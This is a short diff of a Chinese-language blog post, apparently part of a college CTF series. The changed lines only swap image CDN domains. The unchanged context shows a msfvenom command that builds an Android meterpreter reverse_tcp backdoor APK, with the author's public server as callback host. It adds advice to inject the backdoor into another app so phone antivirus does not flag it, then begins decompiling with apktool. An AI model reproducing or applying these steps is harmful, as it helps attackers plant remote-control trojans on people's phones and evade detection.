@@ -15,7 +15,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=5555 R > pente
 
 这里的host我实际上填的是我的公网服务器的IP地址，生成以后，如果直接安装，手机是肯定会报毒的（特别是装的国产定制ROM如MIUI、COLOROS之类的），这个时候就要把我们的后门程序注入到其他的软件里面去
 
-（装上了会像右边这个图标这样，啥也没有，而且点开除了打开了后门也不会有什么反应）![](https://cdn.bilicdn.tk/gh/Vikutorika/assets@master/img/CTF-in-College-7/image-20220624233959348.png?download=true)
+（装上了会像右边这个图标这样，啥也没有，而且点开除了打开了后门也不会有什么反应）![](https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-7/image-20220624233959348.png?download=true)
 
 然后我们反编译一下软件，用Linux（可能会）自带的apktool（如果没有请直走右转Github）
 
@@ -36,7 +36,7 @@ I: Copying unknown files...
 I: Copying original files...
 ```
 
-![](https://cdn.bilicdn.tk/gh/Vikutorika/assets@master/img/CTF-in-College-7/image-20220624234521311.png)
+![](https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-7/image-20220624234521311.png)
 
 这样后门程序就反编译完了，接下来要反编译我们需要的软件
 
